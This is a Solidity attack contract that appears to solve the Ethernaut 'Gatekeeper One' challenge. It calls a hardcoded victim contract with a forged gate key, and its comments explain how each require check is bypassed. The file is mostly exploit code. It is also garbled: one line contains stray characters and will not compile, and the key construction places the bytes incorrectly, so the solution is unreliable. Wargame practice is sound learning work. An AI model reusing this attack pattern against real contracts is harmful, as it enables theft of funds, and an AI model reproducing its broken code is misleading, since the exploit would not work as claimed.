// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* We should make the contract ownable because in a real-world scenario you will not want
others to use your attacking contract. It is not necessary for this solution though.
The Ownable contract of OpenZeppelin will atribute ownership to the deployer and comes 
with a nice "onlyOwner()" modifier for us to use in protected functions.

The target contract has a set of requires to be bypassed to get to the objective of being
a registered entrant. The first condition is that the msg.sender must be different from the
transaction origin. That means we should be using a smart contract as a middle man. The 
second require is that the gas left should be a multiple of 8191. We can adjust that in
the web script. The last three conditions are the code to create the key, that we will
replicate in our attack function here.*/

contract GatekeeperOneAttack{

  // First we need to instantiate the victim contract
  Victim victim = Victim(0xeA1EBCc34A9e86b33E0cc7f325168500cC70B2BB);

  function attackGates(uint gasToSend) public {
    uint16 gateKey16 = uint16(uint160(\\b   n    msg.sender));

    // Convert the uint16 value to bytes2
    bytes2 convertedValueBytes2 = bytes2(abi.encodePacked(gateKey16));

    // Concatenate the bytes2 value with six zero bytes to get bytes8
    bytes8 gateKey8 = bytes8(0) | convertedValueBytes2;

    victim.enter{gas: gasToSend}(gateKey8);
  }

}

/* The easiest way to build an interface for another contract is to just copy the functions
"header" that you are going to use.*/

interface Victim {
  function enter(bytes8 _gateKey) external returns(bool);
}

